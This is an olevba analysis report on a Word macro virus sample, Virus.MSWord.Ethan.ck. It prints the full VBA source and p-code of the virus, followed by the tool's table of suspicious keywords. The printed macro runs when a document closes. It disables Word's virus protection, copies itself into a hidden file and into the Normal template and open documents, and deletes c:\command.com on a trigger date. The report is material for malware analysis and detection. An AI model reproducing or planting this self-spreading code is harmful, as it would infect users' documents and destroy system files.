olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.ck
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.ck - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\winhe.sys", 6) = "" Then
Open "c:\winhe.sys" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).codemodule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).codemodule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\winhe.sys", 6
End If
Dim asd
asd = Date
Dim asd2
asd2 = #7/1/1999#
If asd = asd2 Then Kill "c:\command.com"
If NormalTemplate.VBProject.VBComponents.Item(1).codemodule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).codemodule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\winhe.sys" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.codemodule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.ck
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8000 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #3:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #5:
' 	ArgsCall Read 0x0000 
' Line #6:
' 	LitStr 0x000C "c:\winhe.sys"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #7:
' 	LitStr 0x000C "c:\winhe.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #8:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	For 
' Line #9:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #13:
' 	LitStr 0x000C "c:\winhe.sys"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	Dim 
' 	VarDefn asd
' Line #16:
' 	Ld Date 
' 	St asd 
' Line #17:
' 	Dim 
' 	VarDefn asd2
' Line #18:
' 	LitDate 0x0000 0x0000 0xBEC0 0x40E1 
' 	St asd2 
' Line #19:
' 	Ld asd 
' 	Ld asd2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "c:\command.com"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #20:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #22:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	ElseIfBlock 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #24:
' 	ElseBlock 
' Line #25:
' 	LitStr 0x0000 ""
' 	St t 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #28:
' 	LitStr 0x000C "c:\winhe.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #29:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #30:
' 	LitDI2 0x0001 
' 	St i 
' Line #31:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #33:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd codemodule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #34:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #35:
' 	Loop 
' Line #36:
' 	Label q 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #38:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywords 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' 	EndIf 
' Line #39:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #42:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

